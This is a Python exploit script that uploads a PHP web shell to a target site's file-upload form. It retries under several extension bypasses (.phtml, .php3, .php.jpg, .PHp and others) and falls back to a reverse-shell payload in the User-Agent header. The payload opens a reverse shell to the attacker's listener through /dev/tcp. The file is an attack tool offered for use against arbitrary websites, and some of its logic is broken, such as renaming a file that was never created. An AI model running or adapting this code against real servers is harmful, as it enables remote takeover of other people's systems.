#!/usr/bin/python3
#   This exploit, exploits almost every website with an uploads directory
#       it will try 9 different times to chain the upload bypass in order to get a reverse shell
#           exploit made by: fancy
# __________________________________________________________________________________________________________________
import requests
import os

red = '\033[38;2;255;0;0m\033m'
end = '\033[m'


class UploadDeathBindShell(object):
    def __init__(self, local_host, local_port, parameter, url, uploads_dir):
        self.local_host = local_host
        self.local_port = local_port
        self.parameter = parameter
        self.url = url
        self.uploads_dir = uploads_dir

    def upload(self):
        php_file = f"<?php exec(bash -c 'sh -i >& /dev/tcp/{self.local_host}/{self.local_port} 0>&1'); ?>"
        os.system(f'echo "{php_file}" > uploadzhelloz.php')
        file = {self.parameter: open('uploadzhelloz.php', 'rb')}
        response = requests.post(self.url, files=file)
        if response.status_code == 200:
            r = requests.get(self.uploads_dir + "")
            print(f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
        else:
            os.system("mv uploadzhelloz.php sendall.phtml")
            file = {self.parameter: open('sendall.phtml', 'rb')}
            response = requests.post(self.url, files=file)
            if response.status_code == 200:
                r = requests.get(self.uploads_dir + f"/sendall.phtml")
                print(f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
            else:
                os.system("mv sendall.php sendall.php3")
                file = {self.parameter: open('sendall.php3', 'rb')}
                response = requests.post(self.url, files=file)
                if response.status_code == 200:
                    r = requests.get(self.uploads_dir + f"/sendall.php3")
                    print(
                        f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                else:
                    os.system("mv sendall.php3 sendall.php4")
                    file = {self.parameter: open('sendall.php4', 'rb')}
                    response = requests.post(self.url, files=file)
                    if response.status_code == 200:
                        r = requests.get(self.uploads_dir + f"/sendall.php4")
                        print(
                            f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                    else:
                        os.system("mv sendall.php4 sendall.php5")
                        file = {self.parameter: open('sendall.php5', 'rb')}
                        response = requests.post(self.url, files=file)
                        if response.status_code == 200:
                            r = requests.get(
                                self.uploads_dir + f"/sendall.php5")
                            print(
                                f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                        else:
                            os.system("mv sendall.php5 sendall.inc")
                            file = {self.parameter: open('sendall.inc', 'rb')}
                            response = requests.post(self.url, files=file)
                            if response.status_code == 200:
                                r = requests.get(
                                    self.parameter + f"/sendall.inc")
                                print(
                                    f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                            else:
                                os.system("mv sendall.inc sendall.php.jpg")
                                file = {self.parameter: open('sendall.php.jpg', 'rb')}
                                response = requests.post(self.url, files=file)
                                if response.status_code == 200:
                                    r = requests.get(
                                        self.parameter + f"/sendall.php.jpg")
                                    print(
                                        f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                                else:
                                    os.system("mv sendall.php.jpg sendall.PHp")
                                    file = {self.parameter: open('sendall.PHp', 'rb')}
                                    response = requests.post(self.url, files=file)
                                    if response.status_code == 200:
                                        r = requests.get(
                                            self.uploads_dir + f"/sendall.PHp")
                                        print(
                                            f"[{red}status code>{r.status_code}{end}] reverse shell on>{self.local_host}:{self.local_port}")
                                    else:
                                        user_agent = {
                                            'User-Agent': f"<?php exec(bash -c 'sh -i >& /dev/tcp/{self.local_host}/{self.local_port} 0>&1'); ?>"}
                                        response = requests.get(self.url, headers=user_agent)
                                        if response == 200:
                                            print(f"[{red}Bypass worked by sending user agent reverse shell find it and execute it good luck!{end}]")


if __name__ == "__main__":
    input(f"[{red}+++{end}]  Start A Listener Before You Continue (Press Enter):~#")
    upload_death = UploadDeathBindShell(
        url=input(f"{red}(Upload-Death-RCE){end} [Enter Complete URL Until The Upload Directory]:~#"),
        local_host=input(f"{red}(Upload-Death-RCE){end} [Enter Local Host]:~#"),
        local_port=input(f"{red}(Upload-Death-RCE){end} [Enter Local Port]:~#"),
        parameter=input(f"{red}(Upload-Death-RCE){end} [Enter Parameter That Accepts Files]:~#"),
        uploads_dir=input(f"{red}(Upload-Death-RCE){end} [Where Do Files Get Uploaded To? (FULL URL)]:~#")
    )
    upload_death.upload()
